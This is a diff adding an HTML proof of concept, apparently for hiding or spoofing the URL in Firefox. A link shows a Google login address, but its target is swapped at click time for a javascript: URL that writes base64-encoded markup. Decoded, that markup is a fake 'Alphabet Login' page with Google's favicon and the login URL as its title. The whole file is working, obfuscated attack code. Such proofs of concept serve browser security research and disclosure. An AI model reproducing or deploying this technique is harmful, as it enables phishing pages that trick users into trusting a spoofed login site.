@@ -1,0 +1,16 @@
+<html>
+<head>
+<title>FF-URL-hiding - @qab</title>
+</head>
+<body>
+<a id='q' href='https://login.google.com/'>Click here</a>
+<script>
+
+var payload=btoa('<head><script>q=1;setTimeout($=>{location.reload()},12)<\/script></head>');
+var payload2=('PGgyPldsZWNvbWUgdG8gQWxwaGFiZXQgTG9naW4hPC9oMj4KPHNjcmlwdD4KKGZ1bmN0aW9uKCkgey8vVGhpcyBpcyB0byBzZXQgdGhlIGZhdmljb24KICAgIHZhciBxID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbGluaycpOwogICAgcS50eXBlID0gJ2ltYWdlL3gtaWNvbic7CiAgICBxLnJlbCA9ICdzaG9ydGN1dCBpY29uJzsKICAgIHEuaHJlZiA9ICdodHRwOi8vd3d3Lmdvb2dsZS5jb20vZmF2aWNvbi5pY28nOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXS5hcHBlbmRDaGlsZChxKTsKfSgpKTsKCndpbmRvdy5kb2N1bWVudC50aXRsZT0naHR0cHM6Ly9sb2dpbi5nb29nbGUuY29tLyc7CnNldFRpbWVvdXQocnI9Pntsb2NhdGlvbi5oYXNoPScnfSwxMCk7Cjwvc2NyaXB0Pg==');;
+var ql='javascript:try{q}catch(e){document.write(atob("'+payload2+'"))};`<script>if(location!=this.location){q=window}else{document.write(atob("'+payload+'"))}<\/script>`';
+
+q.addEventListener("click",$=>{q.href=ql;});//We replace the href right before the user clicks it.
+</script>
+</body>
+</html>
